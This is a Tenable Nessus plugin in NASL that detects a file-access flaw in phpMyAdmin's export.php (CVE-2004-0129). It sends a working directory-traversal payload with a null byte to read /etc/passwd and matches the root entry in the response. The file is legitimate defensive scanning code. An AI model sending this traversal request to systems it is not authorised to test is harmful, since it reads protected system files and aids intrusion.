#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
 script_id(12041);
 script_version ("$Revision: 1.17 $");
 script_cvs_date("$Date: 2016/11/02 14:37:08 $");

 script_cve_id("CVE-2004-0129");
 script_bugtraq_id(9564);
 script_osvdb_id(3800);
 
 script_name(english:"phpMyAdmin export.php what Parameter Traversal Arbitrary File Access");
 script_summary(english:"Checks phpMyAdmin");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file inclusion flaw." );
 script_set_attribute(attribute:"description", value:
"There is a bug in the remote version of phpMyAdmin that may allow an
attacker to read arbitrary files on the remote web server with the
privileges of the web user or even execute arbitrary PHP code. 
Successful exploitation of this issue requires that PHP's
'magic_quotes_gpc' setting be disabled." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2004/Feb/55" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/forum/forum.php?forum_id=350228" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpMyAdmin version 2.4.6-rc1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/02/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/02/03");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("phpMyAdmin_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 script_require_keys("www/phpMyAdmin", "www/PHP");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, php:TRUE);


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  u = string(dir,"/export.php?what=../../../../../../../../../../etc/passwd%00");
  r = http_send_recv3(method:"GET", item:u, port:port, exit_on_fail:TRUE);

  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r[2]))
  {
    security_warning(port);
    exit(0);
  }
}
